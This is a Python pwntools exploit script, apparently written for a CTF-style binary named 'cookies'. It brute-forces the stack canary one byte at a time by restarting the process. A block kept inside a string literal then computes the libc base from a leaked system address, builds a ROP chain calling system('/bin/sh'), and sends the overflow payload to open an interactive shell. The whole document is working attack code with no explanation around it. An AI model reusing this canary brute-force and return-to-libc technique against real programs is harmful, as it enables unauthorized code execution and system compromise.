from pwn import *

def get_bf(base):
    canary = b""
    guess = 0x0
    system_addr = 0x0

    while len(canary) < 8:
        while guess <= 0xff:
            target = process("./bin/cookies")
            target.recvuntil("write?")
            target.sendline("6")
            target.recvuntil("What am I?")
            target.sendline("canary")
            target.sendline(base + canary + bytes([guess]))

            response = target.clean()
            if b"stack" not in response:
                print(f"Response: {response}")
                print("Guessed correct byte:", format(guess, '02x'))
                canary += bytes([guess])
                base += bytes([guess])
                guess = 0x0
                target.close()
                break
            else:
                guess += 1
                target.close()

    print("FOUND:\\x" + '\\x'.join("{:02x}".format(c) for c in canary))
    return canary

target = process("./bin/cookies")
c = context.binary = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
rop = ROP(c)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

base = b"a" + 7 * b"A"
canary_guess = get_bf(base)
'''
output = target.recvline()
target.sendline(b"6")
target.sendline("canary")
target.recvline()
output = target.recv()

log.info("system address: %s" % output.decode().split(":")[1].strip())
system_addr = int(output.decode().split(":")[1].strip(), 16)

libc.address = system_addr - libc.sym["system"]
log.info("LIBC address: %s" % hex(libc.address))
binsh_addr = next(libc.search(b"/bin/sh"))
log.info("binsh address: %s" % hex(binsh_addr))

pop_rdi_pop_rbp_ret = (rop.find_gadget(['pop rdi', 'pop rbp','ret']))[0]
log.info("rop: %s" % pop_rdi_pop_rbp_ret)

rop_chain = p64(pop_rdi_pop_rbp_ret) + p64(binsh_addr) + p64(0x0) + p64(system_addr)

payload = base + canary_guess + b"old_rbp\0" + rop_chain

# gdb.attach(target)

target.sendline(payload)
target.interactive()
'''